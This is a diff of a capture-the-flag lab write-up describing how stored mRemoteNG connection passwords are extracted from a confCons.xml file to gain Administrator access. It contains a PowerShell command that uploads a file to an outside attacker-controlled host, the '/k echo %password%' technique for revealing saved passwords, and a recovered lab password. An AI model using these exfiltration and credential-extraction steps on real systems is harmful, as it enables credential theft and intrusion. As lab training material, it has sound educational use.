@@ -39,15 +39,36 @@ This lets us login via `ssh` and grab the `user.txt`!
 
 Found a non-standard tool called `mRemoteNG`
 
-With some research I've found out that `mRemote` saves files in an incsure way within the `confCons.xml` file.
+With some research I've found out that `mRemote` saves files in an insecure way within the `confCons.xml` file.
 
 
 Running this command below to extract the file
 
 ```
-powershell Invoke-WebRequest -Uri http://10.10.14.55:8080 -Method Post -Infile *
+powershell Invoke-WebRequest -Uri http://10.10.14.55:8080 -Method Post -Infile <FILE_NAME>
 ```
 
-Reading the link [here](http://hackersvanguard.com/mremoteng-insecure-password-storage/) it states that the passwords are only encrypted using a static string!
+Reading the link [here](http://hackersvanguard.com/mremoteng-insecure-password-storage/) states that a confCons.xml file can be read into the mRemoteNG program and the password can be viewed.
 
-We can write a quick python script to fuck shit up. 
+Navigating to:
+
+```
+C:\Users\L4mpje\AppData\Roaming\mRemoteNG
+``` 
+
+On the machine gives us access to a `confCons.xml` file.
+
+Loading this into mRemoteNG and following the instructions to add:
+
+```
+/k echo %password%
+```
+
+As the command allows us to view the password
+
+```
+Administrator
+thXLHM96BeKL0ER2
+```
+
+This can be used to log in via SSH and retrieve the flag!
